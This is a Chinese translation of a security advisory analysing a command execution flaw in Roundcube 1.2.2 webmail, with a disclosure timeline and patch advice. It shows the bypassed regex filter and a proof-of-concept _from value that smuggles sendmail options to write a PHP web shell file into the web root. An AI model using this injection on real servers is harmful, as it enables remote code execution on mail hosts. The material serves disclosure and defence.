> 原文链接: https://www.anquanke.com//post/id/85079 


# 【技术分享】Roundcube1.2.2通过email的命令执行漏洞分析


                                阅读量   
                                **141889**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：blog.ripstech.com
                                <br>原文地址：[https://blog.ripstech.com/2016/roundcube-command-execution-via-email/](https://blog.ripstech.com/2016/roundcube-command-execution-via-email/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p4.ssl.qhimg.com/t01c867d7f42b0dc0f2.png)](https://p4.ssl.qhimg.com/t01c867d7f42b0dc0f2.png)**

**<br>**

****

翻译：[sinensis](http://bobao.360.cn/member/contribute?uid=2642794559)

预估稿费：150RMB（不服你也来投稿啊！）

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

<br>

**前言**

Roundcube是一款开源的网页版收发邮件的软件，它分布很广泛，全球很多组织和公司都在使用。从ScourceForge的镜像来看，过去1年内它有26万的下载量，这还只是实际用户中的一小部分。只要Roundcube在服务器上安装成功，已授权用户的浏览器上就会有一个Roundcube的网页页面，用来收发邮件。

这篇文章我们要展示下一个恶意用户如何在Roundcube 1.2.2版（&gt;= 1.0）写封邮件，就可以远程实现任意命令执行。这个漏洞非常危险，它会影响到所有的默认配置安装。我们强烈建议所有的管理员尽快地将Roundcube更新到最新版本1.2.3。

[![](https://p5.ssl.qhimg.com/t018a641efa6b94cf5c.png)](https://p5.ssl.qhimg.com/t018a641efa6b94cf5c.png)

RIPS只用了25秒就对整个应用有了全面的分析，上图是检测出来的安全漏洞。虽然上图看似列出了很多问题，但大部分问题都不严重，它们可能是安装模块的一部分或是死的遗留代码。但是我们还是建议把这些漏洞修复好，移除遗留代码，避免以后出现安全问题，我们之前的文章有提到类似问题。

<br>

**漏洞条件**

1. Roundcube配置的时候必须允许使用mail()函数(如果没有SMTP未指定，默认开启)

2. PHP的main()函数配置的时候使用sendmail(默认开启）

3. PHP的配置文件中设置safe_mode为off（默认开启）

4. 攻击者需要知道网站的绝对路径

上面四个条件一般来说很容易就可以达成，也就是说网络上很多这样的系统都存在漏洞。

<br>

**漏洞描述**

在Roundcube的1.2.2或者更早的版本，用户的输入未过滤进入到了mail()函数，作为第五个参数然后导致RCE，在这篇文档里将其列为紧急安全等级。问题的根本是因为main()函数会导致PHP调用sendmail。sendmail提供了-X选项来保存所有的邮箱日志到文件，攻击者可以利用这个函数在网站的根目录下生成恶意PHP文件。虽然这个漏洞利用起来比较苛刻，但是RIPS在几秒之内就检测了出来，下面的代码可以触发漏洞：

```
program/steps/mail/sendmail.inc
$from = rcube_utils::get_input_value(’_from’, rcube_utils::INPUT_POST, true, $message_charset);
$sent = $RCMAIL-&gt;deliver_message($MAIL_MIME, $from, $mailto,$smtp_error, $mailbody_file, $smtp_opts);
```

在上面代码里面，deliver_messae()函数获取POST参数_from，赋值给$from作为其第二个参数。

```
program/lib/Roundcube/rcube.php
public function deliver_message(&amp;$message, $from, $mailto, &amp;$error, &amp;$body_file = null, $options = null) `{`
    
    if (filter_var(ini_get(‘safe_mode’), FILTER_VALIDATE_BOOLEAN))
        $sent = mail($to, $subject, $msg_body, $header_str);
    else
       $sent = mail($to, $subject, $msg_body, $header_str, “-f$from”);
```

跟进deliver_message函数，$from参数进入mail()函数处理，通过使用-f参数获取from来传递给sendmail。

<br>

**不充分的变量检查**

有趣的部分是from参数在此之前经过了正则过滤。正常来说，$from参数内是不可以使用空格，不然可能导致在-f之后添加其他的参数。

使用$IFS或者`符号都不能绕过。但是，中间有一个逻辑流程可以导致过滤失败。



```
program/steps/mail/sendmail.inc
104 else if ($from_string = rcmail_email_input_format($from)) `{`
105   if (preg_match(‘/(S+@S+)/‘, $from_string, $m))
106        $from = trim($m1, ‘&lt;&gt;‘);
107    else
108        $from = null;
109   `}`
```

在105行，用户可以控制的$from参数过滤之后传递给email，但是这个过滤仅仅在rcmail_email_input_format()为TRUE的时候才会有效。

下面我们来看看如何绕过：

```
program/steps/mail/sendmail.inc
function rcmail_email_input_format($mailto, $count=false, $check=true)
`{`
    global $RCMAIL, $EMAIL_FORMAT_ERROR, $RECIPIENT_COUNT;
    // simplified email regexp, supporting quoted local part
    $email_regexp = ‘(S+|(”[^“]+”))@S+‘;
    ⋮
    // replace new lines and strip ending ‘, ‘, make address input more valid
    $mailto = trim(preg_replace($regexp, $replace, $mailto));
    $items  = rcube_utils::explode_quoted_string($delim, $mailto);
    $result = array();
    foreach ($items as $item) `{`
        $item = trim($item);
        // address in brackets without name (do nothing)
863        if (preg_match(‘/^&lt;‘.$email_regexp.‘&gt;$/’, $item)) `{`
            $item     = rcube_utils::idn_to_ascii(trim($item, ‘&lt;&gt;‘));
            $result[] = $item;
        `}`
        ⋮
        else if (trim($item)) `{`
            continue;
        `}`
        ⋮
    `}`
    if ($count) `{`
        $RECIPIENT_COUNT += count($result);
    `}`
    return implode(‘, ‘, $result);
`}`
```

rcmail_email_input_format这个函数在863行使用另外一个正则表达式，在匹配email的时候，行末匹配符$已经决定了要匹配的内容。

攻击者的payload不必匹配这个正则，然后在foreach循环之后$result参数仍然是空。在这种情况下，876行的implode()函数会返回一个空的字符串(这样整个函数就会返回FALSE)，于是绕过了过滤。

<br>

**漏洞POC**

当使用Roundcube发送email的时候，截断HTTP请求，修改_from字段：



```
example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php
```

上述代码会导致攻击者在网站根目录下生成一个rce.php文件，里面的内容就是_subject的值。请求完成之后，如下的内容就会写入到文件里面：

```
04731 &gt;&gt;&gt; Recipient names must be specified
04731 &lt;&lt;&lt; To: squinty@localhost
04731 &lt;&lt;&lt; Subject: &lt;?php phpinfo(); ?&gt;
04731 &lt;&lt;&lt; X-PHP-Originating-Script: 1000:rcube.php
04731 &lt;&lt;&lt; MIME-Version: 1.0
04731 &lt;&lt;&lt; Content-Type: text/plain; charset=US-ASCII;
04731 &lt;&lt;&lt;  format=flowed
04731 &lt;&lt;&lt; Content-Transfer-Encoding: 7bit
04731 &lt;&lt;&lt; Date: So, 20 Nov 2016 04:02:52 +0100
04731 &lt;&lt;&lt; From: example@example.com -OQueueDirectory=/tmp
04731 &lt;&lt;&lt;  -X/var/www/html/rce.php
04731 &lt;&lt;&lt; Message-ID: &lt;390a0c6379024872a7f0310cdea24900@localhost&gt;
04731 &lt;&lt;&lt; X-Sender: example@example.com -OQueueDirectory=/tmp
04731 &lt;&lt;&lt;  -X/var/www/html/rce.php
04731 &lt;&lt;&lt; User-Agent: Roundcube Webmail/1.2.2
04731 &lt;&lt;&lt; 
04731 &lt;&lt;&lt; Funny e-mail message
04731 &lt;&lt;&lt; [EOF]
```

email的数据解码之后，传递的subject参数会解码为纯文本，然后PHP就会执行其中包含PHP标签的代码。(上面的文本就解析&lt;?php phpinfo() ?&gt;，类似LFI的日志包含）

<br>

**时间线**

**日期**            ** 内容**

2016/11/21  第一次联系软件作者

2016/11/22  作者在Github上修复了bug

2016/11/28  作者同意披露这个漏洞

2016/11/28  软件作者更新了最新Roundcube版本1.2.3



**总结**

Roundcube 1.2.2本身的设计已经可以抵御大部分攻击，同时一大批社区也在一起努力加固软件的安全性。但是像这种比较偏冷门的漏洞还是存在。如果使用自动化测试，不仅仅可以发现这种冷门的漏洞，而且节省了工程师的时间，把更多的精力放在开发更安全的程序上。
